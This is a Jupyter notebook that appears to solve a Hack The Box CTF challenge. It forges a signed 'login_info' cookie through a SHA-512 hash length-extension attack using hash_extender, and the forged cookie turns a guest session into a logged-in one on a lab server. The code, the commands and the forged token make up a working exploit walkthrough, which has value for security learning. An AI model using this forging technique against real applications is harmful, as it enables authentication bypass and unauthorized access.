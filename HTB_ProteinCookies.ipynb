{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Visit http://167.99.82.136:31760\n",
    "Cookies: 'login_info'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "cookie = \"dXNlcm5hbWU9Z3Vlc3QmaXNMb2dnZWRJbj1GYWxzZQ==.ZDc0ODExNGNmYTZmZDFhMzNmZjJiNTNmNDQ2OWFmNWQ1ZTFmYzcyZmFiN2YzMmMwMzMxZDFhYmRjMmMxNWRlMjU1ODQxNDI0NTgwOWViZDU4MGZkMDA5OTEzZDkxYmZmOWU3ODc0MjQ5YTU3NTIyMjZjZWVlMTQwMTQzN2QzMDc=\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "username=guest&isLoggedIn=False\n",
      "d748114cfa6fd1a33ff2b53f4469af5d5e1fc72fab7f32c0331d1abdc2c15de2558414245809ebd580fd009913d91bff9e7874249a5752226ceee1401437d307\n"
     ]
    }
   ],
   "source": [
    "info, hash = cookie.split('.')\n",
    "print(base64.b64decode(info).decode())\n",
    "print(base64.b64decode(hash).decode())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "https://github.com/iagox86/hash_extender\n",
    "\n",
    "`./hash_extender --data 'username=guest&isLoggedIn=False' --secret 16 --append '&username=me&isLoggedIn=True' --signature d748114cfa6fd1a33ff2b53f4469af5d5e1fc72fab7f32c0331d1abdc2c15de2558414245809ebd580fd009913d91bff9e7874249a5752226ceee1401437d307 --format sha512`\n",
    "\n",
    "```\n",
    "Type: sha512\n",
    "Secret length: 16\n",
    "New signature: a70b8e231b26425905c6b7f436cefb7bb6063170d484e25118eb29d3f66536912fe221fc00c9d972e84163fc967591e8a5f036c950ddfad16342318fd08e5bdc\n",
    "New string: 757365726e616d653d67756573742669734c6f67676564496e3d46616c736580000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017826757365726e616d653d6d652669734c6f67676564496e3d54727565\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'dXNlcm5hbWU9Z3Vlc3QmaXNMb2dnZWRJbj1GYWxzZYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABeCZ1c2VybmFtZT1tZSZpc0xvZ2dlZEluPVRydWU=.YTcwYjhlMjMxYjI2NDI1OTA1YzZiN2Y0MzZjZWZiN2JiNjA2MzE3MGQ0ODRlMjUxMThlYjI5ZDNmNjY1MzY5MTJmZTIyMWZjMDBjOWQ5NzJlODQxNjNmYzk2NzU5MWU4YTVmMDM2Yzk1MGRkZmFkMTYzNDIzMThmZDA4ZTViZGM='"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "string = \"757365726e616d653d67756573742669734c6f67676564496e3d46616c736580000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017826757365726e616d653d6d652669734c6f67676564496e3d54727565\"\n",
    "signature = \"a70b8e231b26425905c6b7f436cefb7bb6063170d484e25118eb29d3f66536912fe221fc00c9d972e84163fc967591e8a5f036c950ddfad16342318fd08e5bdc\"\n",
    "\n",
    "base64.b64encode(bytes.fromhex(string)).decode() + \".\" + base64.b64encode(signature.encode()).decode()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Set the `login_info` cookie accordingly. Visit http://167.99.82.136:31760/program for the flag."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "perso",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
